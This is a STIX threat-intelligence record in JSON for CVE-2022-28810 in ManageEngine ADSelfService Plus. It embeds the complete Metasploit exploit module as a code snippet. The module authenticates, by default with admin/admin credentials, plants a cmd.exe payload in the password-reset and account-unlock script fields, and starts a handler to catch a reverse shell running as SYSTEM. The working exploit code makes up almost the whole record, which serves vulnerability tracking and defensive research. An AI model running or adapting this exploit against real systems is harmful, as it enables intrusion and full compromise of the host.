{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9dbb0306-21ba-4c9b-a8f1-067c3f6b18fa",
    "created": "2024-08-14T16:53:17.207375Z",
    "modified": "2024-08-14T16:53:17.207379Z",
    "name": "ManageEngine ADSelfService Plus Custom Script Execution",
    "description": " This module exploits the \"custom script\" feature of ADSelfService Plus. The",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/manageengine_adselfservice_plus_cve_2022_28810.rb",
            "external_id": "manageengine_adselfservice_plus_cve_2022_28810.rb"
        },
        {
            "source_name": "HernanDiaz",
            "external_id": "#AnalysisandCVEcredit"
        },
        {
            "source_name": "AndrewIwamaye",
            "external_id": "#AnalysisandCVEcredit"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-28810"
        },
        {
            "source_name": "reference",
            "url": "https://www.manageengine.com/products/self-service-password/kb/cve-2022-28810.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2022/04/14/cve-2022-28810-manageengine-adselfservice-plus-authenticated-command-execution-fixed/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine ADSelfService Plus Custom Script Execution',\n        'Description' => %q{\n          This module exploits the \"custom script\" feature of ADSelfService Plus. The\n          feature was removed in build 6122 as part of the patch for CVE-2022-28810.\n          For purposes of this module, a \"custom script\" is arbitrary operating system\n          command execution.\n\n          This module uses an attacker provided \"admin\" account to insert the malicious\n          payload into the custom script fields. When a user resets their password or\n          unlocks their account, the payload in the custom script will be executed.\n          The payload will be executed as SYSTEM if ADSelfService Plus is installed as\n          a service, which we believe is the normal operational behavior.\n\n          This is a passive module because user interaction is required to trigger the\n          payload. This module also does not automatically remove the malicious code from\n          the remote target. Use the \"TARGET_RESET\" operation to remove the malicious\n          custom script when you are done.\n\n          ADSelfService Plus uses default credentials of \"admin\":\"admin\"\n        },\n        'Author' => [\n          # Discovered and exploited by unknown threat actors\n          'Jake Baines', # Analysis, CVE credit, and Metasploit module\n          'Hernan Diaz', # Analysis and CVE credit\n          'Andrew Iwamaye', # Analysis and CVE credit\n          'Dan Kelley' # Analysis and CVE credit\n        ],\n        'References' => [\n          ['CVE', '2022-28810'],\n          ['URL', 'https://www.manageengine.com/products/self-service-password/kb/cve-2022-28810.html'],\n          ['URL', 'https://www.rapid7.com/blog/post/2022/04/14/cve-2022-28810-manageengine-adselfservice-plus-authenticated-command-execution-fixed/']\n        ],\n        'DisclosureDate' => '2022-04-09',\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => ARCH_CMD,\n        'Privileged' => true, # false if ADSelfService Plus is not run as a service\n        'Stance' => Msf::Exploit::Stance::Passive,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/jjs_reverse_tcp'\n              }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8888,\n          'DisablePayloadHandler' => true,\n          'JJS_PATH' => '..\\\\jre\\\\bin\\\\jjs.exe'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path traversal for auth bypass', '/']),\n      OptString.new('USERNAME', [true, 'The administrator username', 'admin']),\n      OptString.new('PASSWORD', [true, 'The administrator user\\'s password', 'admin']),\n      OptBool.new('TARGET_RESET', [true, 'On the target, disables custom scripts and clears custom script field', false])\n    ])\n  end\n\n  ##\n  # Because this is an authenticated vulnerability, we will rely on a version string\n  # for the check function. We can extract the version (or build) from selfservice/index.html.\n  ##\n  def check\n    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, '/selfservice/index.html'))\n    unless res\n      return CheckCode::Unknown('The target failed to respond to check.')\n    end\n\n    unless res.code == 200\n      return CheckCode::Safe('Failed to retrieve /selfservice/index.html')\n    end\n\n    ver = res.body[/\\.css\\?buildNo=(?<build_id>[0-9]+)/, :build_id]\n    if ver.nil?\n      return CheckCode::Safe('Could not extract a version number')\n    end\n\n    if Rex::Version.new(ver) < Rex::Version.new('6122')\n      return CheckCode::Appears(\"This determination is based on the version string: #{ver}.\")\n    end\n\n    CheckCode::Safe(\"This determination is based on the version string: #{ver}.\")\n  end\n\n  ##\n  # Authenticate with the remote target. Login requires four steps:\n  #\n  # 1. Grab a CSRF token\n  # 2. Post credentials to /ServletAPI/accounts/login\n  # 3. Post credentials to /j_security_check\n  # 4. Grab another CSRF token for authenticated requests\n  #\n  # @return a new CSRF token to use with authenticated requests\n  ##\n  def authenticate\n    # grab a CSRF token from the index\n    res = send_request_cgi({ 'method' => 'GET', 'uri' => normalize_uri(target_uri.path, '/authorization.do') })\n    fail_with(Failure::Unreachable, 'The target did not respond') unless res\n    fail_with(Failure::UnexpectedReply, 'Failed to grab a CSRF token') if res.get_cookies_parsed.empty? || res.get_cookies_parsed['HttpOnly, adscsrf'].empty?\n    csrf_tok = res.get_cookies_parsed['HttpOnly, adscsrf'].to_s[/HttpOnly, adscsrf=(?<token>[0-9a-f-]+); path=/, :token]\n    fail_with(Failure::UnexpectedReply, 'Failed to grab a CSRF token') unless csrf_tok\n\n    # send the first login request to get the ssp token\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/ServletAPI/accounts/login'),\n      'keep_cookies' => true,\n      'vars_post' =>\n      {\n        'loginName' => datastore['USERNAME'],\n        'domainName' => 'ADSelfService Plus Authentication',\n        'j_username' => datastore['USERNAME'],\n        'j_password' => datastore['PASSWORD'],\n        'AUTHRULE_NAME' => 'ADAuthenticator',\n        'adscsrf' => csrf_tok\n      }\n    })\n    fail_with(Failure::NoAccess, 'Log in attempt failed') unless res.code == 200\n\n    # send the second login request to get the sso token\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/j_security_check'),\n      'keep_cookies' => true,\n      'vars_post' =>\n      {\n        'loginName' => datastore['USERNAME'],\n        'domainName' => 'ADSelfService Plus Authentication',\n        'j_username' => datastore['USERNAME'],\n        'j_password' => datastore['PASSWORD'],\n        'AUTHRULE_NAME' => 'ADAuthenticator',\n        'adscsrf' => csrf_tok\n      }\n    })\n    fail_with(Failure::NoAccess, 'Log in attempt failed') unless res.code == 302\n\n    # revisit authorization.do to complete authentication\n    res = send_request_cgi({ 'method' => 'GET', 'uri' => normalize_uri(target_uri.path, '/authorization.do'), 'keep_cookies' => true })\n    fail_with(Failure::NoAccess, 'Log in attempt failed') unless res.code == 200\n    fail_with(Failure::UnexpectedReply, 'Failed to grab a CSRF token') if res.get_cookies_parsed.empty? || res.get_cookies_parsed['adscsrf'].empty?\n    csrf_tok = res.get_cookies_parsed['adscsrf'].to_s[/adscsrf=(?<token>[0-9a-f-]+);/, :token]\n    fail_with(Failure::UnexpectedReply, 'Failed to grab a CSRF token') unless csrf_tok\n\n    print_good('Authentication successful')\n    csrf_tok\n  end\n\n  ##\n  # Triggering the payload requires user interaction. Using the default payload\n  # handler will cause this module to exit after planting the payload, so the\n  # module will spawn it's own handler so that it doesn't exit until a shell\n  # has been received/handled. Note that this module is passive so it should\n  # just be chilling quietly in the background.\n  #\n  # This code is largely copy/paste from windows/local/persistence.rb\n  ##\n  def create_multihandler(lhost, lport, payload_name)\n    pay = framework.payloads.create(payload_name)\n    pay.datastore['LHOST'] = lhost\n    pay.datastore['LPORT'] = lport\n    print_status('Starting exploit/multi/handler')\n\n    # Set options for module\n    mh = framework.exploits.create('multi/handler')\n    mh.share_datastore(pay.datastore)\n    mh.datastore['PAYLOAD'] = payload_name\n    mh.datastore['EXITFUNC'] = 'thread'\n    mh.datastore['ExitOnSession'] = true\n    # Validate module options\n    mh.options.validate(mh.datastore)\n    # Execute showing output\n    mh.exploit_simple(\n      'Payload' => mh.datastore['PAYLOAD'],\n      'LocalInput' => user_input,\n      'LocalOutput' => user_output,\n      'RunAsJob' => true\n    )\n\n    # Check to make sure that the handler is actually valid\n    # If another process has the port open, then the handler will fail\n    # but it takes a few seconds to do so.  The module needs to give\n    # the handler time to fail or the resulting connections from the\n    # target could end up on on a different handler with the wrong payload\n    # or dropped entirely.\n    Rex.sleep(5)\n    return nil if framework.jobs[mh.job_id.to_s].nil?\n\n    return mh.job_id.to_s\n  end\n\n  # The json policy blob that ADSSP provides us is not accepted by ADSSP\n  # if we try to POST it back. Specifically, ADSP is very unhappy about all\n  # the booleans using \"true\" or \"false\" instead of \"1\" or \"0\" *except* for\n  # HIDE_CAPTCHA_RPUA which has to remain a boolean. Sounds unbelievable, but\n  # here we are.\n  def fix_adssp_json(json_hash)\n    json_hash.map do |key, value|\n      if value.is_a? Hash\n        [key, fix_adssp_json(value)]\n      elsif value.is_a? Array\n        value = value.map do |array_val|\n          if array_val.is_a? Hash\n            array_val = fix_adssp_json(array_val)\n          end\n          array_val\n        end\n        [key, value]\n      elsif key == 'HIDE_CAPTCHA_RPUA'\n        [key, value]\n      elsif value.is_a? TrueClass\n        [key, 1]\n      elsif value.is_a? FalseClass\n        [key, 0]\n      else\n        [key, value]\n      end\n    end.to_h\n  end\n\n  def exploit\n    csrf_tok = authenticate\n\n    # Grab the list of configured policies\n    policy_list_uri = normalize_uri(target_uri.path, '/ServletAPI/configuration/policyConfig/getPolicyConfigDetails')\n    print_status(\"Requesting policy list from #{policy_list_uri}\")\n    res = send_request_cgi({ 'method' => 'GET', 'uri' => policy_list_uri })\n    fail_with(Failure::UnexpectedReply, 'Log in attempt failed') unless res.code == 200\n    policy_json = res.get_json_document\n    fail_with(Failure::UnexpectedReply, \"The target didn't return a JSON body\") if policy_json.nil?\n    policy_details_json = policy_json['POLICY_DETAILS']\n    fail_with(Failure::UnexpectedReply, \"The target didn't have any configured policies\") if policy_details_json.nil?\n\n    # There can be multiple policies. This logic will loop over each one, grab the configuration\n    # details, update the configuration to include our payload, and then POST it back.\n    policy_details_json.each do |policy_entry|\n      policy_id = policy_entry['POLICY_ID']\n      policy_name = policy_entry['POLICY_NAME']\n      fail_with(Failure::UnexpectedReply, 'Policy details missing name or id') if policy_id.nil? || policy_name.nil?\n\n      print_status(\"Requesting policy details for #{policy_name}\")\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, '/ServletAPI/configuration/policyConfig/getAPCDetails'),\n        'vars_get' =>\n        {\n          'POLICY_ID' => policy_id\n        }\n      })\n      fail_with(Failure::UnexpectedReply, 'Acquiring specific policy details failed') unless res.code == 200\n\n      # load the JSON and insert (or remove) our payload\n      specific_policy_json = res.get_json_document\n      fail_with(Failure::UnexpectedReply, \"The target didn't return a JSON body\") if specific_policy_json.nil?\n      fail_with(Failure::UnexpectedReply, \"The target didn't contain the expected JSON\") if specific_policy_json['SCRIPT_COMMAND_RESET'].nil?\n      new_payload = \"cmd.exe /c #{payload.encoded}\"\n\n      if datastore['TARGET_RESET']\n        print_status('Disabling custom script functionality')\n        specific_policy_json['IS_CUSTOM_SCRIPT_ENABLED_RESET'] = '0'\n        specific_policy_json['SCRIPT_COMMAND_RESET'] = ''\n        specific_policy_json['IS_CUSTOM_SCRIPT_ENABLED_UNLOCK'] = '0'\n        specific_policy_json['SCRIPT_COMMAND_UNLOCK'] = ''\n      else\n        print_status('Enabling custom scripts and inserting the payload')\n        specific_policy_json['IS_CUSTOM_SCRIPT_ENABLED_RESET'] = '1'\n        specific_policy_json['SCRIPT_COMMAND_RESET'] = new_payload\n        specific_policy_json['IS_CUSTOM_SCRIPT_ENABLED_UNLOCK'] = '1'\n        specific_policy_json['SCRIPT_COMMAND_UNLOCK'] = new_payload\n      end\n\n      # fix up the ADSSP provided json so ADSSP will accept it o.O\n      updated_policy = fix_adssp_json(specific_policy_json).to_json\n\n      policy_update_uri = normalize_uri(target_uri.path, '/ServletAPI/configuration/policyConfig/setAPCDetails')\n      print_status(\"Posting updated policy configuration to #{policy_update_uri}\")\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => policy_update_uri,\n        'vars_post' =>\n        {\n          'APC_SETTINGS_DETAILS' => updated_policy,\n          'POLICY_NAME' => policy_name,\n          'adscsrf' => csrf_tok\n        }\n      })\n      fail_with(Failure::UnexpectedReply, 'Policy update request failed') unless res.code == 200\n\n      # spawn our own payload handler?\n      if !datastore['TARGET_RESET'] && datastore['DisablePayloadHandler']\n        listener_job_id = create_multihandler(datastore['LHOST'], datastore['LPORT'], datastore['PAYLOAD'])\n        if listener_job_id.blank?\n          print_error(\"Failed to start exploit/multi/handler on #{datastore['LPORT']}, it may be in use by another process.\")\n        end\n      else\n        print_good('Done!')\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-04-09",
    "x_mitre_platforms": [
        "win'"
    ]
}